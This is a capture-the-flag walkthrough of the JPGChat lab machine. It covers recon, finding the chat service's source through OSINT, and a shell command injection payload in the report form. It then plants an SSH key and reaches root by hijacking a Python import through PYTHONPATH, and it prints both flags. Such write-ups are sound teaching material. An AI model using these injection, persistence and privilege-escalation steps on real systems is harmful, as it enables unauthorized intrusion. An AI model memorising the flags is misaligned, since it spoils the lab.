# JPGChat

Exploiting poorly made custom chatting service written in a certain language...

Hack into the machine and retrieve the flag

# Establish a foothold and get user.txt

*Hint: Can you get the applications source code, this can be found at the admins github. Where could we be able to find the admins name? Check out the whole application.*

## Initial foothold

Nmap reveals 2 services: a SSH connection on port 22 and an unknown service on port 3000.

~~~
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 fe:cc:3e:20:3f:a2:f8:09:6f:2c:a3:af:fa:32:9c:94 (RSA)
|   256 e8:18:0c:ad:d0:63:5f:9d:bd:b7:84:b8:ab:7e:d1:97 (ECDSA)
|_  256 82:1d:6b:ab:2d:04:d5:0b:7a:9b:ee:f4:64:b5:7f:64 (ED25519)
3000/tcp open  ppp?
| fingerprint-strings: 
|   GenericLines, NULL: 
|     Welcome to JPChat
|     source code of this service can be found at our admin's github
|     MESSAGE USAGE: use [MESSAGE] to message the (currently) only channel
|_    REPORT USAGE: use [REPORT] to report someone to the admins (with proof)
~~~

Connecting to port 3000 with `nc` shows a message and expects a `[MESSAGE]` or `[REPORT]`. Let's try with `[MESSAGE]`:

~~~
kali@kali:/data/vpn$ nc 10.10.65.28 3000
Welcome to JPChat
the source code of this service can be found at our admin's github
MESSAGE USAGE: use [MESSAGE] to message the (currently) only channel
REPORT USAGE: use [REPORT] to report someone to the admins (with proof)
[MESSAGE]
There are currently 0 other users logged in
[MESSAGE]: hello
[MESSAGE]: quit
[MESSAGE]: ^C
~~~

Now, sending `[REPORT]` will disclose a username: `Mozzie-jpg`

~~~
kali@kali:/data/vpn$ nc 10.10.65.28 3000
Welcome to JPChat
the source code of this service can be found at our admin's github
MESSAGE USAGE: use [MESSAGE] to message the (currently) only channel
REPORT USAGE: use [REPORT] to report someone to the admins (with proof)
[REPORT]
this report will be read by Mozzie-jpg
your name:
test
your report:
test
~~~

## OSInt

As we are told that "the source code of this service can be found at our admin's github", we start searching for `Mozzie-jpg JPGChat` on the Internet, which leads to the [below source code](https://raw.githubusercontent.com/Mozzie-jpg/JPChat/main/jpchat.py):

```python
#!/usr/bin/env python3

import os

print ('Welcome to JPChat')
print ('the source code of this service can be found at our admin\'s github')

def report_form():

	print ('this report will be read by Mozzie-jpg')
	your_name = input('your name:\n')
	report_text = input('your report:\n')
	os.system("bash -c 'echo %s > /opt/jpchat/logs/report.txt'" % your_name)
	os.system("bash -c 'echo %s >> /opt/jpchat/logs/report.txt'" % report_text)

def chatting_service():

	print ('MESSAGE USAGE: use [MESSAGE] to message the (currently) only channel')
	print ('REPORT USAGE: use [REPORT] to report someone to the admins (with proof)')
	message = input('')

	if message == '[REPORT]':
		report_form()
	if message == '[MESSAGE]':
		print ('There are currently 0 other users logged in')
		while True:
			message2 = input('[MESSAGE]: ')
			if message2 == '[REPORT]':
				report_form()

chatting_service()
```

## Vulnerability

We immediately identify a vulnerability in the `report_form()` function, as the script is calling `os.system()` to execute a `bash` command where the user input is passed without being sanitized.

Let's check if we can inject code. The expected string passed to `os.system()` is as follows:

~~~
echo 'your name'    > /opt/jpchat/logs/report.txt
echo 'your report' >> /opt/jpchat/logs/report.txt
~~~

As we know the user input is not sanitized, we could send a string that would execute the following content:

~~~
echo ''                       > /opt/jpchat/logs/report.txt
echo 'bla';/bin/bash;echo '' >> /opt/jpchat/logs/report.txt
~~~

## Exploit

Use anything for the name and send `bla';/bin/bash;echo '` for the report:

~~~
kali@kali:/data/JPGChat$ nc 10.10.65.28 3000
Welcome to JPChat
the source code of this service can be found at our admin's github
MESSAGE USAGE: use [MESSAGE] to message the (currently) only channel
REPORT USAGE: use [REPORT] to report someone to the admins (with proof)
[REPORT]
this report will be read by Mozzie-jpg
your name:
bla
your report:
bla';/bin/bash;echo '
myname
id
uid=1001(wes) gid=1001(wes) groups=1001(wes)
~~~

## SSH connection

At this stage, it seems to be a good idea to add your SSH public key to be able to directly connect via SSH.

~~~
python3 -c "import pty;pty.spawn('/bin/bash')"
wes@ubuntu-xenial:~$ ll  
ll
total 24
drwxr-xr-x 2 wes  wes  4096 Jan 15 18:58 ./
drwxr-xr-x 3 root root 4096 Jan 15 18:57 ../
-rw------- 1 wes  wes     0 Jan 15 18:58 .bash_history
-rw-r--r-- 1 wes  wes   220 Aug 31  2015 .bash_logout
-rw-r--r-- 1 wes  wes  3771 Aug 31  2015 .bashrc
-rw-r--r-- 1 wes  wes   655 Jul 12  2019 .profile
-rw-r--r-- 1 root root   38 Jan 15 18:58 user.txt
wes@ubuntu-xenial:~$ mkdir .ssh
mkdir .ssh
wes@ubuntu-xenial:~$ cd .ssh
cd .ssh
wes@ubuntu-xenial:~/.ssh$ cat > authorized_keys << EOF
cat > authorized_keys << EOF
> ssh-rsa AAAAB3NzaC1yc2EAAAADAQA[REDACTED]5IKZVtD53kcT6xDO+m7pk= kali@kali       
> EOF
EOF
~~~

And now, let's connect:

~~~
kali@kali:/data/JPGChat/files/JPGChat$ ssh wes@10.10.65.28
$ id
uid=1001(wes) gid=1001(wes) groups=1001(wes)
~~~

## User flag

Let's get the user flag:

~~~
$ pwd 
/home/wes
$ ll
-sh: 4: ll: not found
$ ls -la
total 36
drwxr-xr-x 4 wes  wes  4096 Apr 30 06:49 .
drwxr-xr-x 3 root root 4096 Jan 15 18:57 ..
-rw------- 1 wes  wes  1437 Apr 30 06:52 .bash_history
-rw-r--r-- 1 wes  wes   220 Aug 31  2015 .bash_logout
-rw-r--r-- 1 wes  wes  3771 Aug 31  2015 .bashrc
drwx------ 2 wes  wes  4096 Apr 30 06:49 .cache
-rw-r--r-- 1 wes  wes   655 Jul 12  2019 .profile
drwxr-xr-x 3 wes  wes  4096 Apr 30 06:51 .ssh
-rw-r--r-- 1 root root   38 Jan 15 18:58 user.txt
$ cat user.txt
JPC{487030410a543503cbb59ece16178318}
~~~

User flag: `JPC{487030410a543503cbb59ece16178318}`

# Escalate your privileges to root and read root.txt

*Hint: In the sudo -l output, you can see that PYTHONPATH variable will be kept. Can you exploit this? Google around*

## Checking sudo privileges

Our `wes` user can execute `/usr/bin/python3 /opt/development/test_module.py` as `root` with `sudo` without password:

~~~
$ sudo -l
Matching Defaults entries for wes on ubuntu-xenial:
    mail_badpass, env_keep+=PYTHONPATH

User wes may run the following commands on ubuntu-xenial:
    (root) SETENV: NOPASSWD: /usr/bin/python3 /opt/development/test_module.py
~~~

The sciprt is in read-only mode:

~~~
$ ls -l /opt/development/test_module.py
-rw-r--r-- 1 root root 93 Jan 15 18:58 /opt/development/test_module.py
~~~

Here is the code:

```python
$ cat /opt/development/test_module.py
#!/usr/bin/env python3

from compare import *

print(compare.Str('hello', 'hello', 'hello'))
```

## Python library hijacking

We can hijack the import by creating our own `compare` module, and inject the path of this module in the `PYTHONPATH` environment variable:

~~~
$ cat > compare.py << EOF
> import os
> os.system('/bin/bash')
> EOF
$ chmod +x compare.py
$ export PYTHONPATH=/home/wes
$ sudo /usr/bin/python3 /opt/development/test_module.py
root@ubuntu-xenial:~# id
uid=0(root) gid=0(root) groups=0(root)
~~~

## Root flag

Awesome! Now, let's get the root flag:

~~~
root@ubuntu-xenial:~# cd /root
root@ubuntu-xenial:/root# ls -la
total 24
drwx------  3 root root 4096 Jan 15 18:58 .
drwxr-xr-x 25 root root 4096 Apr 30 05:28 ..
-rw-r--r--  1 root root 3106 Oct 22  2015 .bashrc
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-r--r--  1 root root  305 Jan 15 18:58 root.txt
drwx------  2 root root 4096 Jan 15 18:56 .ssh
root@ubuntu-xenial:/root# cat root.txt 
JPC{665b7f2e59cf44763e5a7f070b081b0a}

Also huge shoutout to Westar for the OSINT idea
i wouldn't have used it if it wasnt for him.
and also thank you to Wes and Optional for all the help while developing

You can find some of their work here:
https://github.com/WesVleuten
https://github.com/optionalCTF
~~~

Root flag: `JPC{665b7f2e59cf44763e5a7f070b081b0a}`
